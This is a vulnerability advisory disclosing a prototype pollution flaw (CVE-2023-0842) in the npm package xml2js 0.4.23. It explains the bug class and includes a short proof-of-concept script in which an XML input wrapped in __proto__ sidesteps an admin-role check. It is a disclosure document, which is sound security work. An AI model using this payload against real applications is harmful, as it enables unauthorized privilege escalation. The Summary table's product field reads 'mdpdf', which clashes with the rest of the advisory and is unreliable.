---
slug: advisories/myers/
title: xml2js 0.4.23          -         Prototype Pollution
authors: Carlos Bello
writer: cbello
codename: myers
product: xml2js 0.4.23  -  Prototype Pollution
date: 2023-02-20 12:00 COT
cveid: CVE-2023-0842
severity: 7.3
description: xml2js 0.4.23          -         Prototype Pollution
keywords: Fluid Attacks, Security, Vulnerabilities, NPM, Prototype Pollution
banner: advisories-bg
advise: yes
template: maskedAdvisory
encrypted: yes
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | xml2js 0.4.23 - Prototype Pollution                                |
| **Code name**         | [Myers](https://en.wikipedia.org/wiki/Bryant_Myers)                |
| **Product**           | mdpdf                                                              |
| **Affected versions** | Version 0.4.23                                                     |
| **State**             | Public                                                             |
| **Release date**      | 2023-02-20                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Prototype Pollution                                                                                                         |
| **Rule**              | [390. Prototype Pollution](https://docs.fluidattacks.com/criteria/vulnerabilities/390)                                      |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:L                                                                                |
| **CVSSv3 Base Score** | 7.3                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-0842](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0842)                                               |

## Description

xml2js version 0.4.23 allows an external attacker to edit or add new
properties to an object. This is possible because the application does
not properly validate incoming JSON keys, thus allowing the `__proto__`
property to be edited.

## Vulnerability

Prototype pollution is a vulnerability that affects JS. It occurs when a
third party manages to modify the `__proto__` of an object. JavaScript
first checks if such a method/attribute exists in the object. If so, then
it calls it. If not, it looks in the object's prototype. If the method/attribute
is also not in the object's prototype, then the property is said to be undefined.

Therefore, if an attacker succeeds in injecting the `__proto__` property into an
object, he will succeed in injecting or editing its properties.

## Exploitation

### Exploit.md

```js
var parseString = require('xml2js').parseString;

let normal_user_request    = "<role>admin</role>";
let malicious_user_request = "<__proto__><role>admin</role></__proto__>";

const update_user = (userProp) => {
    // A user cannot alter his role. This way we prevent privilege escalations.
    parseString(userProp, function (err, user) {
        if(user.hasOwnProperty("role") && user?.role.toLowerCase() === "admin") {
            console.log("Unauthorized Action");
        } else {
            console.log(user?.role[0]);
        }
    });
}

update_user(normal_user_request);
update_user(malicious_user_request);
```

## Evidence of exploitation

![Explotation-xml2js](https://user-images.githubusercontent.com/51862990/219061662-8134c98a-e0bf-40c9-9834-426f5213add6.png)

## Our security policy

We have reserved the ID CVE-2023-0842 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: xml2js 0.4.23

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://github.com/Leonidas-from-XIV/node-xml2js/>

## Timeline

<time-lapse
  discovered="2023-02-14"
  contacted="2023-02-14"
  replied="2023-02-14"
  confirmed=""
  patched=""
  disclosure="">
</time-lapse>
